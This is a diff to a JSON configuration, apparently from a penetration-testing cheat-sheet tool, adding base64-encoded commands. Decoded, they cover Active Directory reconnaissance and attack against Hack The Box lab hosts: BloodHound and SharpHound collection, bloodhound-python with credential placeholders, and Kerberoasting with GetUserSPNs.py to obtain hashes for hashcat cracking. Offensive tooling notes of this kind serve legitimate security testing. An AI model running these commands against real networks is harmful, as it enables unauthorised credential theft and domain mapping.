@@ -5,6 +5,12 @@
             "commands": [
                 "I0luZ2VzdG9yczoKaHR0cHM6Ly9naXRodWIuY29tL0Jsb29kSG91bmRBRC9CbG9vZEhvdW5kL3RyZWUvbWFzdGVyL0luZ2VzdG9ycwoKI1ByZS1jb21waWxlZCBCSCBCaW5hcmllczoKaHR0cHM6Ly9naXRodWIuY29tL0Jsb29kSG91bmRBRC9CbG9vZEhvdW5kL3JlbGVhc2VzCgojRmluZCBrZXJiZXJvYXN0YWJsZSB2aWEgdGhlIGJsb29kaG91bmQvc2hhcnBob3VuZCBkYXRhLCB0aGVuIHlvdSBjYW4gZG8gdGhpczoKCkdldFVzZXJTUE5zLnB5IC1yZXF1ZXN0IC1kYy1pcCAxMC4xMC4xMC4xMDAgYWN0aXZlLmh0Yi9zdmNfdGdzCgpXaGljaCB3aWxsIGdpdmUgeW91IGEgbW9kZSAxMzEwMCBoYXNoIGZvciBoYXNoY2F0IHRvIGNyYWNrIGZvciB0aGUgcGFzc3dvcmQuIAoKCiNUbyBnZXQgc2hhcnBob3VuZCBkYXRhIGZyb20gbm9uLWRvbWFpbiBqb2luZWQgbWFjaGluZSwgZG8gdGhpczoKCnJ1bmFzIC9uZXRvbmx5IC91c2VyOmRvbWFpbnVzZXIKCltlbnRlciBwYXNzd29yZCBmb3IgZG9taWFuIHVzZXJdCgojVGhlbiB0aGF0IHNoZWxsIHdpbGwgYXV0b21hZ2ljYWxseSBwYXNzIGRvbWFpbiBhdXRoIHRvIERDIGFuZCB5b3UgY2FuIGRvIHRoaXMgdG8gY29sbGVjdCBkYXRhOgoKc2hhcnBob3VuZC5leGUgLWMgYWxsIC1kIERPTUFJTiAtLWRvbWFpbmNvbnRyb2xsZXIgWC5YLlguWA=="
             ]
+        },
+        "bloodhound_python": {
+            "description": "Python remote ingestor (run on attacker linux machine) usage",
+            "commands": [
+                "cGlwIGluc3RhbGwgYmxvb2Rob3VuZApibG9vZGhvdW5kLXB5dGhvbiAtZCBodGIubG9jYWwgLXUgVVNFUiAtcCBQQVNTV09SRCAtZGMgc2VydmVyX25hbWUuaHRiLmxvY2FsIC1ucyAxMC4xMC4xMC5Y"
+            ]
         }
     },
     "configuration": {
